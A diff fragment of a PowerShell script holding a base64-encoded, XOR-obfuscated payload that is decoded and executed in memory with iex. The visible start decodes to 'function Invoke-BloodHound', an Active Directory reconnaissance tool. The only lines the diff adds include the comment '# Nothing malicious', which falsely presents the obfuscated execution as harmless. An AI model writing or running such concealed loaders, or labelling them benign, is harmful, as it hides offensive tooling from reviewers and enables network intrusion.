@@ -15,3 +15,5 @@ $EncodedText = "d2R/cmV4fn8xWH9nfnp0PFN9fn51WX5kf3UbahsxMTExLTIbMTExMT9CSF9eQUJY
 $file = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($EncodedText))
 $data = $enc.GetBytes($file)|%{$_-bXor0x11}
 iex ([System.Text.Encoding]::ASCII.GetString($data))
+
+# Nothing malicious
